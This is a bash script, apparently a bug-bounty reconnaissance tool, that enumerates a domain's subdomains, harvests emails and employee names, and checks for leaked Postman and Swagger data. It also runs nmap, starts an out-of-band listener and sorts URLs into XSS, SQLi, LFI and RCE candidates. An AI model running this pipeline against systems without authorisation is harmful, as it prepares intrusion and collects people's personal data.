#!/bin/bash


tools=/root/Tools
Bugcrowd=X-Bug-Bounty:riverhunter
dnsDictionary=./$dirdomain/wordlist/dns_wordlist.txt
aquatoneTimeout=50000
dictionary=/root/wordlists/dicc.txt
dirsearchWordlist=~/tools/sec/Discovery/Web-Content/dirsearch.txt
feroxbuster=~/tools/feroxbuster
paramspider=~/tools/ParamSpider/paramspider.py
#Colors Output
NORMAL="\e[0m"			
RED="\033[0;31m" 		
GREEN="\033[0;32m"		   
BOLD="\033[01;01m"    	
WHITE="\033[1;37m"		
YELLOW="\033[1;33m"	
LRED="\033[1;31m"		
LGREEN="\033[1;32m"		
LBLUE="\033[1;34m"			
LCYAN="\033[1;36m"		
SORANGE="\033[0;33m"		      		
DGRAY="\033[1;30m"		
DSPACE="  "
DTAB="\t\t"
TSPACE="   "
TTAB="\t\t\t"
QSPACE="    "
QTAB="\t\t\t\t"
BLINK="\e[5m"
TICK="\u2714"
CROSS="\u274c"


if [ $# -ne 1 ]; then
    printf "Usage: $0 <domain>"
    exit 1
fi
domain=$1
dirdomain=$(printf $domain | awk -F[.] '{print $1}')
mkdir -p "${dirdomain}"
mkdir -p "/usr/share/sniper/loot/workspace/${dirdomain}"
mkdir -p "${dirdomain}/subdomains"
mkdir -p "${dirdomain}/osint"
mkdir -p "${dirdomain}/info"
mkdir -p "${dirdomain}/wordlist"
mkdir -p "${dirdomain}/fuzzing"
mkdir -p "${dirdomain}/parameters"
mkdir -p "${dirdomain}/vulnerability"
iptxt="${dirdomain}/info/ip.txt"
subdomains_file="${dirdomain}/subdomains/subdomains.txt"
subdomains_live="${dirdomain}/subdomains/livesubdomain.txt"
workspace="/usr/share/sniper/loot/workspace/${dirdomain}"
input_file=""
threads=100
url_file="${dirdomain}/crawling.txt"
dns_wordlist=/root/Desktop/work/dns_wordlist.txt
file_list=/root/tools/sec/Fuzzing/XSS/XSS-OFJAAAH.txt
report_file="${dirdomain}/vulnerability/xss_urls.txt"
fuzz_file=/root/tools/sec/Discovery/Web-Content/common.txt
cors_file="${dirdomain}/vulnerability/cors_vurls.txt"

printf "${GREEN} 
  / \ / \ / \ / \ / \ / \ / \ / \ 
 ( R | e | v | e | r | H | u | n )
  \_/ \_/ \_/ \_/ \_/ \_/ \_/ \_/\n "| pv -qL 30
printf " ${YELLOW}RiverHunter>${end}${GREEN} More Targets - More Options - More Opportunities${end}" 
sleep 0.4
printf  "${NORMAL}\n[${CROSS}] ${NORMAL}Warning: Use with caution. You are responsible for your own actions.${NORMAL}\n"
printf  "${NORMAL}[${CROSS}] ${NORMAL}Developers assume no liability and are not responsible for any misuse or damage cause by this tool.${NORMAL}\n"


	if nc -zw1 google.com 443 2>/dev/null; then
		printf  ${GREEN}"Connection: ${RED}OK\n"
	else
		printf  "${RED}[!] Please check your internet connection and then try again...\n"
		exit 1
	fi
check_and_download() {

    local file_path="$1"

    local download_url="$2"

    local file_name="${file_path##*/}"


    if [ -f "$file_path" ]; then

        printf "File $file_name already exists.\n"

    else

        curl -# -o "$file_path" "$download_url"

        printf "Downloading $file_name.\n"

    fi

}



check_and_download "$dirdomain/wordlist/resolvers.txt" "https://raw.githubusercontent.com/kh4sh3i/Fresh-Resolvers/master/resolvers.txt"
check_and_download "$dirdomain/wordlist/resolvers2.txt" "https://raw.githubusercontent.com/six2dez/resolvers_reconftw/main/resolvers.txt"
check_and_download "$dirdomain/wordlist/resolvers_trusted.txt" "https://raw.githubusercontent.com/six2dez/resolvers_reconftw/main/resolvers_trusted.txt"
check_and_download "$dirdomain/wordlist/large.txt" "https://raw.githubusercontent.com/s0md3v/Arjun/master/arjun/db/large.txt"
check_and_download "$dirdomain/wordlist/headers_inject.txt" "https://gist.github.com/six2dez/d62ab8f8ffd28e1c206d401081d977ae/raw"


check_and_download "$dirdomain/wordlist/subs_wordlist_big.txt" "https://raw.githubusercontent.com/n0kovo/n0kovo_subdomains/main/n0kovo_subdomains_huge.txt"
check_and_download "$dirdomain/wordlist/ssti_wordlist.txt" "https://gist.githubusercontent.com/six2dez/ab5277b11da7369bf4e9db72b49ad3c1/raw"
check_and_download "$dirdomain/wordlist/lfi_wordlist.txt" "https://gist.githubusercontent.com/six2dez/a89a0c7861d49bb61a09822d272d5395/raw"
check_and_download "$dirdomain/wordlist/subs_wordlist.txt" "https://gist.github.com/six2dez/a307a04a222fab5a57466c51e1569acf/raw"








printf "${GREEN}#######################################################################\n"
domainName="https://"$domain
company=$(printf $dirdomain | awk -F[.] '{print $1}')
printf "${BOLD}${GREEN}[*] Time: ${YELLOW}${TSPACE}$(date "+%d-%m-%Y %H:%M:%S")${NORMAL}\n"
printf "${BOLD}${GREEN}[*] COMPANY:${YELLOW} $company ${NORMAL}\n"
printf "${BOLD}${GREEN}[*] Output:  ${YELLOW}$(pwd)/$dirdomain${NORMAL}\n"
printf "${BOLD}${GREEN}[*] TARGET URL:${YELLOW} $domainName ${NORMAL}\n"
ip_adress=$(dig +short $domain)
printf "${BOLD}${GREEN}[*] TARGET IP : ${YELLOW}$ip_adress ${TTAB}${NORMAL}\n"
printf "${GREEN}#######################################################################\n"
printf "${BOLD}${GREEN}[*] Starting subdomain enumeration for  ${YELLOW}$domain${NORMAL}\n"
    echo -ne "${NORMAL}${BOLD}${YELLOW}\n[*] Subdomain Scanning  -  ${NORMAL}[${LRED}${BLINK}subfinder${NORMAL}]"
    subfinder -silent -d $domain -all -t $threads -o ${dirdomain}/subdomains/subfinder.txt &> /dev/null
    echo -e "\033[2A"
    echo -ne "${NORMAL}${BOLD}${SORANGE}\n[*] Subdomain Scanned  -  ${NORMAL}[${GREEN}subfinder${TICK}${NORMAL}]${TTAB} Subdomain Found: ${LGREEN}$(cat ${dirdomain}/subdomains/subfinder.txt 2> /dev/null | wc -l )"
    echo -ne "${NORMAL}${BOLD}${YELLOW}\n[*] Subdomain Scanning  -  ${NORMAL}[${RED}${BLINK}assetfinder${NORMAL}]"
    assetfinder --subs-only $domain | sort -u | anew -q ${dirdomain}/subdomains/assetfinder.txt
    echo -e "\033[2A"
    echo -ne "${NORMAL}${BOLD}${SORANGE}\n[*] Subdomain Scanned  -  ${NORMAL}[${GREEN}assetfinder${TICK}${NORMAL}]${DTAB} Subdomain Found: ${LGREEN}$(cat ${dirdomain}/subdomains/assetfinder.txt 2> /dev/null | wc -l )"
    echo -ne "${NORMAL}${BOLD}${YELLOW}\n[*] Subdomain Scanning  -  ${NORMAL}[${LRED}${BLINK}findomain${NORMAL}]"
    findomain -r -q -t $domain | anew -q ${dirdomain}/subdomains/findomain.txt &> /dev/null
    echo -e "\033[2A"
    echo -ne "${NORMAL}${BOLD}${SORANGE}\n[*] Subdomain Scanned  -  ${NORMAL}[${GREEN}findomain${TICK}${NORMAL}]${TTAB} Subdomain Found: ${LGREEN}$(cat ${dirdomain}/subdomains/findomain.txt 2> /dev/null | wc -l )"
    echo -ne "${NORMAL}${BOLD}${YELLOW}\n[*] Subdomain Scanning  -  ${NORMAL}[${LRED}${BLINK}dnsx${NORMAL}]"
   dnsx -silent -rcode noerror -d $domain -w $dirdomain/wordlist/subs_wordlist.txt | cut -d' ' -f1| anew -q ${dirdomain}/subdomains/dnsx.txt &> /dev/null
    echo -e "\033[2A"
    echo -ne "${NORMAL}${BOLD}${SORANGE}\n[*] Subdomain Scanned  -  ${NORMAL}[${GREEN}dnsxdomain${TICK}${NORMAL}]${TTAB} Subdomain Found: ${LGREEN}$(cat ${dirdomain}/subdomains/dnsx.txt 2> /dev/null | wc -l )"
    echo -ne "${NORMAL}${BOLD}${YELLOW}\n[*] Subdomain Scanning  -  ${NORMAL}[${LRED}${BLINK}sublist3r${NORMAL}]"
    python3 ~/tools/Sublist3r/sublist3r.py -d $domain -t $threads -o ${dirdomain}/subdomains/sublister.txt &> /dev/null
    echo -e "\033[2A"
    echo -ne "${NORMAL}${BOLD}${SORANGE}\n[*] Subdomain Scanned  -  ${NORMAL}[${GREEN}sublist3r${TICK}${NORMAL}]${TTAB} Subdomain Found: ${LGREEN}$(cat ${dirdomain}/subdomains/sublister.txt 2> /dev/null | wc -l )"
    echo -ne "${NORMAL}${BOLD}${YELLOW}\n[*] Subdomain Scanning  -  ${NORMAL}[${LRED}${BLINK}amass${NORMAL}]"
    amass enum -passive -norecursive -d $domain -o ${dirdomain}/subdomains/amass.txt &> /dev/null
    echo -e "\033[2A"
    echo -ne "${NORMAL}${BOLD}${SORANGE}\n[*] Subdomain Scanned  -  ${NORMAL}[${GREEN}amass${TICK}${NORMAL}]${TTAB} Subdomain Found: ${LGREEN}$(cat ${dirdomain}/subdomains/amass.txt 2> /dev/null | wc -l )"
   echo -ne "${NORMAL}${BOLD}${YELLOW}\n[*] Subdomain Scanning  -  ${NORMAL}[${LRED}${BLINK}Alienvault${NORMAL}]"
    curl -s "https://otx.alienvault.com/api/v1/indicators/domain/${domain}/passive_dns" | jq --raw-output '.passive_dns[]?.hostname' | sort -u >> ${dirdomain}/subdomains/Alienvault.txt &> /dev/null
    echo -e "\033[2A"
    echo -ne "${NORMAL}${BOLD}${SORANGE}\n[*] Subdomain Scanned  -  ${NORMAL}[${GREEN}Alienvault${TICK}${NORMAL}]${TTAB} Subdomain Found: ${LGREEN}$(cat ${dirdomain}/subdomains/Alienvault.txt 2> /dev/null | wc -l )"
    echo -ne "${NORMAL}${BOLD}${YELLOW}\n[*] Subdomain Scanning  -  ${NORMAL}[${LRED}${BLINK}Certspo${NORMAL}]"
curl -s "https://api.certspotter.com/v1/issuances?domain=${domain}&include_subdomains=true&expand=dns_names" | jq -r '.[].dns_names[]' | sed 's/\*\.//g' | sort -u >> "${dirdomain}/subdomains/Certspotter.txt" 2>/dev/null 
    echo -e "\033[2A"
    echo -ne "${NORMAL}${BOLD}${SORANGE}\n[*] Subdomain Scanned  -  ${NORMAL}[${GREEN}Certspo${TICK}${NORMAL}]${TTAB} Subdomain Found: ${LGREEN}$(cat ${dirdomain}/subdomains/Certspotter.txt 2> /dev/null | wc -l )"
    echo -ne "${NORMAL}${BOLD}${YELLOW}\n[*] Subdomain Scanning  -  ${NORMAL}[${LRED}${BLINK}CertSH${NORMAL}]"
   curl -s https://crt.sh/?q\=%.${domain}\&output\=json | jq -r '.[].name_value' | sed 's/\*\.//g' | sort -u >> ${dirdomain}/subdomains/CertSH.txt &> /dev/null
    echo -e "\033[2A"
    echo -ne "${NORMAL}${BOLD}${SORANGE}\n[*] Subdomain Scanned  -  ${NORMAL}[${GREEN}CertSH${TICK}${NORMAL}]${TTAB} Subdomain Found: ${LGREEN}$(cat ${dirdomain}/subdomains/CertSH.txt 2> /dev/null | wc -l )"
     echo -ne "${NORMAL}${BOLD}${YELLOW}\n[*] Subdomain Scanning  -  ${NORMAL}[${LRED}${BLINK}Urlscan${NORMAL}]"
   curl -s "https://urlscan.io/api/v1/search/?q=domain:${domain}"|jq '.results[].page.domain' 2>/dev/null |grep -o "\w.*${domain}"|sort -u >> ${dirdomain}/subdomains/urlscan.txt &> /dev/null
    echo -e "\033[2A"
    echo -ne "${NORMAL}${BOLD}${SORANGE}\n[*] Subdomain Scanned  -  ${NORMAL}[${GREEN}Urlscan${TICK}${NORMAL}]${TTAB} Subdomain Found: ${LGREEN}$(cat ${dirdomain}/subdomains/urlscan.txt 2> /dev/null | wc -l )"  
      echo -ne "${NORMAL}${BOLD}${YELLOW}\n[*] Subdomain Scanning  -  ${NORMAL}[${LRED}${BLINK}Haketarget${NORMAL}]"
   curl -s "https://api.hackertarget.com/hostsearch/?q=${domain}"|grep -o "\w.*${domain}">> ${dirdomain}/subdomains/hackertarget.txt &> /dev/null
    echo -e "\033[2A"
    echo -ne "${NORMAL}${BOLD}${SORANGE}\n[*] Subdomain Scanned  -  ${NORMAL}[${GREEN}Haketarget${TICK}${NORMAL}]${TTAB} Subdomain Found: ${LGREEN}$(cat ${dirdomain}/subdomains/hackertarget.txt 2> /dev/null | wc -l )"     
     echo -ne "${NORMAL}${BOLD}${YELLOW}\n[*] Subdomain Scanning  -  ${NORMAL}[${LRED}${BLINK}RapidDNS${NORMAL}]"
   curl -s "https://rapiddns.io/subdomain/${domain}?full=1#result" |grep -Po "(([\w.-]*)\.([\w]*)\.([A-z]))\w+" |grep ".${domain}" | sort -u >> ${dirdomain}/subdomains/RapidDNS.txt &> /dev/null
    echo -e "\033[2A"
    echo -ne "${NORMAL}${BOLD}${SORANGE}\n[*] Subdomain Scanned  -  ${NORMAL}[${GREEN}RapidDNS${TICK}${NORMAL}]${TTAB} Subdomain Found: ${LGREEN}$(cat ${dirdomain}/subdomains/RapidDNS.txt 2> /dev/null | wc -l )"     
#    echo -ne "${NORMAL}${BOLD}${YELLOW}\n[*] Active Subdomain Scanning is in progress:${NORMAL}\n"
#    echo -e "${NORMAL}${WHITE}${BOLD}${LRED}[!]${NORMAL}${WHITE}${BOLD}${LRED} Please be patient. This may take a while...${NORMAL}"
#        echo -ne "${NORMAL}${BOLD}${YELLOW}[*] Active Subdomain Scanning  -  ${NORMAL}[${RED}${BLINK}gobuster${NORMAL}]"
 #   gobuster dns -d $domain -w ~/wordlists/subdomains.txt -t $threads --timeout 3s -q -o  ${dirdomain}/subdomains/active_gobuster.txt
 #   echo -e "\033[1A"
#    echo -ne "${NORMAL}${BOLD}${SORANGE}[*] Active Subdomain Scanned  -  ${NORMAL}[${GREEN}gobuster${TICK}${NORMAL}]${DTAB} Subdomain Found: ${RED}$(cat ${dirdomain}/subdomains/active_gobuster.txt 2> /dev/null | wc -l )"
 #   echo -ne "${NORMAL}${BOLD}${YELLOW}\n[*] Active Subdomain Scanning  -  ${NORMAL}[${RED}${BLINK}amass${NORMAL}]"
#    timeout 22m amass enum -active -brute -w ~/wordlists/subdomains.txt -d $domain -o ${dirdomain}/subdomains/active_amass.txt &> /dev/null
#    echo -e "\033[2A"
 #   echo -ne "${NORMAL}${BOLD}${SORANGE}\n[*] Active Subdomain Scanned  -  ${NORMAL}[${GREEN}amass${TICK}${NORMAL}]${DTAB} Subdomain Found: ${RED}$(cat ${dirdomain}/subdomains/active_amass.txt 2> /dev/null | wc -l )\n"
 echo -ne "\n${NORMAL}${BOLD}${YELLOW}[●] Subdomain Scanning:${NORMAL}${BOLD} Filtering Alive subdomains\r"
cat ${dirdomain}/subdomains/*.txt | anew -q ${dirdomain}/subdomains/subdomains.txt
    echo -ne "\n${NORMAL}${BOLD}${YELLOW}[●] Endpoints Scanning:${NORMAL}${BOLD} Getting all endpoints\r"
    cat ${dirdomain}/subdomains/subdomains.txt | gauplus --random-agent -b eot,jpg,jpeg,gif,css,tif,tiff,png,ttf,otf,woff,woff2,ico,pdf,svg,txt -t $threads -o ${dirdomain}/subdomains/gauplus.txt
    cat ${dirdomain}/subdomains/subdomains.txt | waybackurls | anew -q ${dirdomain}/subdomains/waybackurls.txt
    cat ${dirdomain}/subdomains/gauplus.txt ${dirdomain}/subdomains/waybackurls.txt 2> /dev/null | sed '/\[/d' | grep $domain | sort -u | urldedupe -s | anew -q ${dirdomain}/subdomains/endpoints.txt
    echo -ne "${NORMAL}${BOLD}${YELLOW}[●] Endpoints Scanning:${NORMAL}${BOLD} Filtering all endpoints\r"
    cat ${dirdomain}/subdomains/endpoints.txt | gf xss | sed "s/'\|(\|)//g" | qsreplace "FUZZ" 2> /dev/null | anew -q ${dirdomain}/parameters/xss.txt
    cat ${dirdomain}/subdomains/endpoints.txt | gf ssrf | sed "s/'\|(\|)//g" | qsreplace "FUZZ" 2> /dev/null | anew -q ${dirdomain}/parameters/ssrf.txt
    cat ${dirdomain}/subdomains/endpoints.txt | gf sqli | sed "s/'\|(\|)//g" | qsreplace "FUZZ" 2> /dev/null | anew -q ${dirdomain}/parameters/sqli.txt
    cat ${dirdomain}/subdomains/endpoints.txt | gf lfi | sed "s/'\|(\|)//g" | qsreplace "FUZZ" 2> /dev/null | anew -q ${dirdomain}/parameters/lfi.txt
    cat ${dirdomain}/subdomains/endpoints.txt | gf rce | sed "s/'\|(\|)//g" | qsreplace "FUZZ" 2> /dev/null | anew -q ${dirdomain}/parameters/rce.txt
    cat ${dirdomain}/subdomains/endpoints.txt | gf REDirect | sed "s/'\|(\|)//g" | qsreplace "FUZZ" 2> /dev/null | anew -q ${dirdomain}/parameters/openREDirect.txt 

    echo -ne "${NORMAL}${BOLD}${LGREEN}[●] Endpoints Scanning Completed for Subdomains of ${NORMAL}${BOLD}${RED}$domain${RED}${WHITE}\t Total: ${GREEN}$(cat ${dirdomain}/subdomains/endpoints.txt 2> /dev/null | wc -l )\n"















cat ${dirdomain}/subdomains/subfinder.txt ${dirdomain}/subdomains/assetfinder.txt ${dirdomain}/subdomains/findomain.txt ${dirdomain}/subdomains/WebArchive.txt ${dirdomain}/subdomains/Alienvault.txt ${dirdomain}/subdomains/Certspotter.txt ${dirdomain}/subdomains/CertSH.txt ${dirdomain}/subdomains/hackertarget.txt ${dirdomain}/subdomains/urlscan.txt ${dirdomain}/subdomains/RapidDNS.txt ${dirdomain}/subdomains/dnsx.txt|sort |uniq >> $subdomains_file
printf  "${YELLOW}Total of $(wc -l $subdomains_file | awk '{print $1}') Subdomains Found\n"
cat $subdomains_file | sort -u |  shuffledns -d $domain -silent -r ./$dirdomain/wordlist/resolvers.txt -o  ./$dirdomain/shuffledns.txt
cat $subdomains_file ./$dirdomain/shuffledns.txt | sort -u | httpx -silent -o ${dirdomain}/subdomains/httpx.txt 
cat ${dirdomain}/subdomains/httpx.txt | grep -Eo "https?://[^/]+\.${domain}" >> $subdomains_live
printf  "${YELLOW}Total of $(wc -l $subdomains_live  | awk '{print $1}') live subdomains were found\n"
printf "${GREEN}#######################################################################\n\n"
porch-pirate -s $domain --dump  > ${dirdomain}/osint/postman_leaks.txt
python3 /root/Tools/SwaggerSpy/swaggerspy.py $domain | grep -i "[*]\|URL" > ${dirdomain}/osint/swagger_leaks.txt
emailfinder -d $domain  | anew -q ${dirdomain}/osint/emailfinder.txt
cat ${dirdomain}/osint/emailfinder.txt | grep "@" | grep -iv "|_" | anew -q ${dirdomain}/osint/emails.txt
rm -f ${dirdomain}/osint/emailfinder.txt
printf "${GREEN}#######################################################################\n\n"
	printf "${GREEN}[+] Whois Lookup${NORMAL}\n"	
	printf "${NORMAL}${YELLOW}Searching domain name details, contact details of domain owner, domain name servers, netRange, domain dates, expiry records, records last updated...${NORMAL}\n\n"
	whois $domain | grep 'Domain\|Registry\|Registrar\|Updated\|Creation\|Registrant\|Name Server\|DNSSEC:\|Status\|Whois Server\|Admin\|Tech' | grep -v 'the Data in VeriSign Global Registry' | tee ./$dirdomain/info/whois.txt
printf "${GREEN}###################################${end} ${bold}${RED}Done.${end}${end}" |	
	printf "\n${GREEN}[+] Nslookup ${NORMAL}\n"
	printf "${NORMAL}${YELLOW}Searching DNS Queries...${NORMAL}\n\n"
	nslookup $domain | tee ./$dirdomain/info/nslookup.txt
printf "${GREEN}###################################${end} ${bold}${RED}Done.${end}${end}" |	
	printf "\n${GREEN}[+] Horizontal domain correlation/acquisitions ${NORMAL}\n"
	printf "${NORMAL}${YELLOW}Searching horizontal domains...${NORMAL}\n\n"
	email=$(whois $domain | grep "Registrant Email" | egrep -ho "[[:graph:]]+@[[:graph:]]+")
	curl -s -A "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36" "https://viewdns.info/reversewhois/?q=$email" | html2text | grep -Po "[-a-zA-Z0-9@:%._\+~#=]{1,256}\.[a-zA-Z0-9()]{1,6}\b([-a-zA-Z0-9()@:%_\+.~#?&//=]*)" | tail -n +4  | head -n -1 
printf "${GREEN}###################################${end} ${bold}${RED}Done.${end}${end}" |	
	printf "\n${GREEN}[+] ASN Lookup ${NORMAL}\n"
	printf "${NORMAL}${YELLOW}Searching ASN number of a company that owns the domain...${NORMAL}\n\n"
	python3 ~/tools/Asnlookup/asnlookup.py -o $domain | tee -a ./$dirdomain/info/asn.txt
printf "${GREEN}###################################${end} ${bold}${RED}Done.${end}${end}" |	
	printf "\n${GREEN}[+] WhatWeb ${NORMAL}\n"
	printf "${NORMAL}${YELLOW}Searching platform, type of script, google analytics, web server platform, IP address, country, server headers, cookies...${NORMAL}\n\n"
	whatweb -i $subdomains_live --log-brief ./$dirdomain/info/whatweb.txt
printf "${GREEN}###################################${end} ${bold}${RED}Done.${end}${end}" |	
	printf "\n${GREEN}[+] SSL Checker ${NORMAL}\n"
	printf "${NORMAL}${YELLOW}Collecting SSL/TLS information...${NORMAL}\n\n"
	python3 ~/tools/ssl-checker/ssl_checker.py -f $subdomains_live | tee ./$dirdomain/info/ssl.txt
printf "${GREEN}###################################${end} ${bold}${RED}Done.${end}${end}" |
printf "\n${GREEN}[+] TheHarvester ${NORMAL}\n"
	printf "${NORMAL}${YELLOW}Searching emails, subdomains, hosts, employee names...${NORMAL}\n\n"
	theHarvester -d $domain -b all -l 500 -f theharvester.html > ./$dirdomain/info/theharvester.txt
	printf "${NORMAL}${YELLOW}Users found: ${NORMAL}\n\n"
	cat ./$dirdomain/info/theharvester.txt | awk '/Users/,/IPs/' | sed -e '1,2d' | head -n -2 | anew -q ./$dirdomain/info/users.txt
	cat ./$dirdomain/info/users.txt
	printf "${NORMAL}${YELLOW}IP's found: ${NORMAL}\n\n"
	cat ./$dirdomain/info/theharvester.txt | awk '/IPs/,/Emails/' | sed -e '1,2d' | head -n -2 | anew -q ./$dirdomain/info/ips.txt
	cat ./$dirdomain/info/ips.txt
	printf "${NORMAL}${YELLOW}Emails found: ${NORMAL}\n\n"
	cat ./$dirdomain/info/theharvester.txt | awk '/Emails/,/Hosts/' | sed -e '1,2d' | head -n -2 | anew -q ./$dirdomain/info/emails.txt
	cat ./$dirdomain/info/emails.txt
	printf "${NORMAL}${YELLOW}Hosts found: ${NORMAL}\n\n"
	cat ./$dirdomain/info/theharvester.txt | awk '/Hosts/,/Trello/' | sed -e '1,2d' | head -n -2 | anew -q ./$dirdomain/info/hosts.txt
	cat ./$dirdomain/info/hosts.txt
	
	printf "\n${GREEN}[+] CloudEnum ${NORMAL}\n"
	printf "${NORMAL}${YELLOW}Searching public resources in AWS, Azure, and Google Cloud....${NORMAL}\n\n"
	key=$(printf $domain | sed s/".com"//)
	python3 ~/tools/cloud_enum/cloud_enum.py -k $key --quickscan | tee ./$dirdomain/info/cloud.txt
	
printf "\n${GREEN}[+] Robots.txt ${NORMAL}\n"
	printf "${NORMAL}${YELLOW}Checking directories and files from robots.txt...${NORMAL}\n\n"
	python3 ~/tools/robotScraper/robotScraper.py -d $domain -s ./$dirdomain/info/output_robot.txt 

	
printf "${GREEN}########################################${end} ${bold}${RED}Done.${end}${end}" |	
printf "${GREEN}#######################################################################\n\n"
printf -e "${GREEN}Starting up listen server..."
printf "${GREEN}#######################################################################\n\n"
interactsh-client  -v &> ./$dirdomain/listen_server.txt & SERVER_PID=$!
sleep 5 # to properly start listen server
LISTENSERVER=$(tail -n 1 ./$dirdomain/listen_server.txt)
LISTENSERVER=$(printf $LISTENSERVER | cut -f2 -d ' ')
printf  "${YELLOW}Listen server is up $LISTENSERVER with PID=$SERVER_PID "

printf "${GREEN}##########################################${end} ${bold}${RED}Done.${end}${end}" |
printf "${GREEN}#######################################################################\n\n"
printf "${GREEN}Checking http://crt.sh "
printf "${GREEN}#######################################################################\n\n"
 ~/tools/massdns/scripts/ct.py $domain 2>/dev/null > ./$dirdomain/tmp.txt
 [ -s ./$dirdomain/tmp.txt ] && cat ./$dirdomain/tmp.txt | ~/tools/massdns/bin/massdns -r ./$dirdomain/wordlist/resolvers.txt -t A -q -o S -w  ./$dirdomain/crtsh.txt
printf "${GREEN}######################################${end} ${bold}${RED}Done.${end}${end}" |


printf "${GREEN}#######################################################################\n\n"
printf "${GREEN}Check if the Domains is running WordPress or Joomla or Drupal"
printf "${GREEN}#######################################################################\n\n"
websites_file="$subdomains_live" 
CMSresult="./$dirdomain/info/CMSresult.txt"  

printf " ${GREEN}RiverHunter>${end}${BOLD}${BLUE} Check if the Domains is running WordPress or Joomla or Drupal${end}" | pv -qL 30
sleep 0.4
printf
if [ ! -f "$websites_file" ]; then
    printf "Websites file not found: $websites_file"
    exit 1
fi

while IFS= read -r website; do
    html_content=$(curl -s "$website")
    
    if printf "$html_content" | grep -q -E 'wp-content|wp-includes|wordpress|WordPress|Wordpress'; then
        cms="WordPress"
    elif printf "$html_content" | grep -q -E 'Joomla|joomla.xml'; then
        cms="Joomla"
    elif printf "$html_content" | grep -q -E 'shopify'; then
        cms="shopify"
    elif printf "$html_content" | grep -q -E 'hubspot'; then
        cms="hubspot"
    elif printf "$html_content" | grep -q -E 'weebly'; then
        cms="weebly"
     elif printf "$html_content" | grep -q -E 'wix'; then
        cms="wix"
      elif printf "$html_content" | grep -q -E 'moodle'; then
        cms="moodle"
      elif printf "$html_content" | grep -q -E 'prestashop'; then
        cms="prestashop"                   
    elif printf "$html_content" | grep -q -E 'Drupal|core/modules|composer/Plugin'; then
        cms="Drupal"
    else
        cms="Unknown"
    fi
    
    if [ "$cms" != "Unknown" ]; then
        printf "[+]${GREEN}$website ========>is running $cms."
        printf "$website ========>is running $cms." >> "$CMSresult"
    else
        printf "${YELLOW}$website ${RED}Unknown."
    fi
    
done < "$websites_file"

printf "${GREEN}#######################################################################\n\n"
printf "${GREEN}Check which Server the Domains is running"
printf "${GREEN}#######################################################################\n\n"
Serverresult="./$dirdomain/info/Serverresult.txt"
while IFS= read -r website; do
    html_content=$(curl -I "$website" 2>&1 | grep -i 'server:')
printf "[+]${GREEN}$website${YELLOW}   running $html_content"
printf "[+]${GREEN}$website${YELLOW}   running $html_content" >>"$Serverresult"
done < "$websites_file"




printf "${GREEN}#######################################################################\n\n"
printf "${GREEN}Geting All The IPs of Subdomains .."
printf "${GREEN}#######################################################################\n\n"

cat $subdomains_file | sort -u |  shuffledns -d $domain -silent -r ./$dirdomain/wordlist/resolvers.txt -o  ./$dirdomain/shuffledns.txt 
for url in $(cat ./$dirdomain/shuffledns.txt);do
 ip=$(dig +short $url|grep -oE "\b([0-9]{1,3}\.){3}[0-9]{1,3}\b"|head -1)
  if [ -n "$ip" ]; then
    printf "${GREEN}[+] $url => ${YELLOW}$ip"
    printf $url >> $iptxt
  else
    printf "${RED}[!] $url => [RESOLVE ERROR]"
  fi
	done
#cat ./$dirdomain/info/ssl.txt |grep -oP 'Server IP: \K.*' >> $iptxt 
#cat ./$dirdomain/info/whatweb.txt |grep -oP 'IP\[\K[^]]+' >> $iptxt 
#sort $iptxt | uniq >> $iptxt		
printf "${GREEN}#######################################################################\n\n"
wordcount=$(wc -l $subdomains_live | grep -o '[0-9]\+')
if [ "$wordcount" -gt 1200 ]; then
:
else
printf " ${bold}${GREEN}[+] We find ${bold}${RED}$wordcount${bold}${GREEN}active subdomains...Running Nmap on them${NORMAL}\n"
fi
grep -oE '(https?://)?([^/]+)' $subdomains_live | sed -E 's/https?:\/\///' > ./$dirdomain/scan.txt
nmap -iL ./$dirdomain/scan.txt -A > ./$dirdomain/info/nmap.txt
rm ./$dirdomain/scan.txt
printf "${GREEN}#######################################################################\n\n"
printf "${GREEN}Technology detection..."
printf "${GREEN}#######################################################################\n\n"
 # webanalyze
printf "[*] Running webanalyze..."
webanalyze -hosts $subdomains_live -apps /usr/local/lib/python3.11/dist-packages/Wappalyzer/data/technologies.json output ./$dirdomain/info/webanalyze.json
printf "${YELLOW}[+] Technology detection complete! Output saved to: $dirdomain"
printf "${GREEN}#######################################${end} ${bold}${RED}Done.${end}${end}" |

printf "${GREEN}#######################################################################\n\n"

printf "${GREEN}fetch url from wayback,"
printf "${GREEN}#######################################################################\n\n"
if [ -f $dirdomain/wayback_output.txt ]; then
   printf "File already exists"
else
katana -list $subdomains_live > ./$dirdomain/crawlin.txt
cat $subdomains_live | waybackurls  >./$dirdomain/wayback_output.txt
cat $subdomains_live | gauplus --random-agent -b eot,jpg,jpeg,gif,css,tif,tiff,png,ttf,otf,woff,woff2,ico,pdf,svg,txt -o ./$dirdomain/gauplus.txt
cat $subdomains_live | hakrawler | tee -a ./$dirdomain/hakrawler-urls.txt



cat ./$dirdomain/wayback_output.txt | sed '/\[/d' | grep $domain | sort -u | urldedupe -s | anew -q > ./$dirdomain/endpoints.txt
sort ./$dirdomain/endpoints.txt ./$dirdomain/crawlin.txt ./$dirdomain/gauplus.txt ./$dirdomain/hakrawler-urls.txt |uniq > ./$dirdomain/crawling.txt
printf -ne "${GREEN}[[*]] fetch Endpoints done  -  ${GREEN}Endpoints Found: ${RED}$(cat $dirdomain/crawling.txt 2> /dev/null | wc -l )"
fi 
printf "${GREEN}###########################################${end} ${bold}${RED}Done.${end}${end}" |
printf "${GREEN}#######################################################################\n\n"
printf -e "${GREEN}find interesting data in site..."
printf "${GREEN}#######################################################################\n\n"
cat ./$dirdomain/crawling.txt | gf interestingEXT | grep -viE '(\.(js|css|svg|png|jpg|woff))' | qsreplace -a | httpx -mc 200 -silent | awk '{ print $1}' > ./$dirdomain/interesting.txt
printf  "${YELLOW}Find $(wc -l ./$dirdomain/interesting.txt | awk '{print $1}') interesting data in site"
printf "${GREEN}##########################################${end} ${bold}${RED}Done.${end}${end}" |
printf "${GREEN}#######################################################################\n\n"
printf -e "${GREEN}[+] Vulnerability: Secrets in JS..."
printf "${GREEN}#######################################################################\n\n"

printf "\n${GREEN}[+] Vulnerability: Secrets in JS${NORMAL}\n"
	printf "${NORMAL}${YELLOW}Obtaining all the JavaScript files of the domain ...${NORMAL}\n\n"	
	cat ./$dirdomain/crawling.txt | grep '\.js$' | httpx -mc 200 -content-type -silent | grep 'application/javascript' | awk -F '[' '{print $1}' | tee -a ./$dirdomain/js.txt
